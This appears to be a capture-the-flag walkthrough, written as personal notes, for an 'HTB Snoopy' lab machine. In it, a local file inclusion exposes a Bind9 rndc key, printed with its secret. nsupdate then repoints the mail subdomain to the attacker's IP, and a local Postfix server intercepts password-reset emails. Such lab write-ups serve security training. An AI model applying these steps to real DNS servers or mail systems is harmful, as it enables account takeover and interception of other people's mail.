# DNS - A collection of attack paths

## DNS - Mail subdomain redirection
```
# DNS - Mail subdomain redirection
1. Nmap reveals that a Bind9 svc is running on port 53.

2. Through a LFI we print the svc config file using its default location (https://www.digitalocean.com/community/tutorials/how-to-configure-bind-as-a-private-network-dns-server-on-ubuntu-20-04)
/etc/bind/named.conf.local

Reading the named.conf.local file, we see a configuration setting related to the snoopy.htb zone.

zone "snoopy.htb" IN {
    type master;
    file "/var/lib/bind/db.snoopy.htb";
    allow-update { key "rndc-key"; };
    allow-transfer { 10.0.0.0/8; };
};

3. The allow-update directive specifies the permissions for making updates to the DNS zone. In this case, it specifies a key, denoted as "rndc-key" , which acts as the authentication mechanism

With this configuration in place, anyone possessing the rndc-key can add, modify, or delete DNS records within the "snoopy.htb" domain.

4. Through the LFI, we obtain the key stored in : /etc/bind/named.conf
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";
    <THIS PART RIGHT HERE>
    key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
    };
    <THIS PART RIGHT HERE>
Saved in rndc.key
5. Before testing the key's validity, check the existing DNS records : ig axfr @10.10.11.212 snoopy.htb
We might not see the `mail.snoopy.htb` in the list.

We attempt to add it using the obtained key :
nsupdate -k rndc.key
> server 10.10.11.212
> zone snoopy.htb
> update add mail.snoopy.htb. 60 A 10.10.14.23
> send
> quit

Docs : 
-k : We specify the key file to which we saved the obtained rndc key earlier.
server : We set the DNS server to the target IP address; subsequent updates will be sent to this
server.
zone : DNS zone to be updated, in this case, snoopy.htb .
update add : We add a new DNS record within the specified zone; adding an A record for
mail.snoopy.htb with a TTL (time to live) of 60 seconds, mapping the domain to the IP address
of our attacking machine, 10.10.14.23

6. Using dig again, we see that the `mail` domain is pointing to our addr

7. We have control over the mail server. If the target configured mail.snoopy.htb to handle all mail, we should now be able to receive mail, since we have pointed that domain to our machine. 
We noticed
before that we had possible usernames with a valid way to identify registered users.
We set up Wireshark to listen on our tun0 adapter and attempt to use the XXX service to send a password reset to any of the users we found, using the search filter tcp.port == 25 , which is used by
default for the SMTP protocol.

From the captured packets that the target server did in fact try to send an email over port 25 but the packet was dropped, as indicated by the red highlighting, since we do not have any mail servers
installed.

8. Install postfix + start the svc:
When installing the service for the first time, we are prompted for a few configuration parameters. For our purposes, selecting the Internet Site configuration is sufficient. In the second prompt, we set
the domain name to snoopy.htb , as that is the domain used by the emails we discovered during our enumeration.
The aforementioned parameters can also be added for an existing installation using the following commands :
sudo postconf -e "myhostname = snoopy.htb"
sudo postconf -e "mynetworks = 10.0.0.0/8"

9. Tailoring our installation of postfix :
In Wireshark, incoming pkts should not be dropped anymore (not highlighted in red).
The error stating that the recipient address was rejected is due to the user being "unknown in the local recipient table

To receive mail as the user we are sending a password reset for, namely sbrown , there are a couple of things we need to do. 
First, we create the user locally.

sudo useradd sbrown

Then we need to create the /var/mail/sbrown file and change the ownership to sbrown.

sudo touch /var/mail/sbrown; sudo chown sbrown:sbrown /var/mail/sbrown

When we attempt to send another password reset attempt we see that the email is sent successfully.

10. check the contents of the /var/mail/sbrown file
sudo cat /var/mail/sbrown

11. If there are multiple characters that are incorrect in the mail. Using this online converter (Encode/Decode Quoted Printable : https://www.webatic.com/quoted-printable-convertor), we are able to decode the URL from quoted printable format
```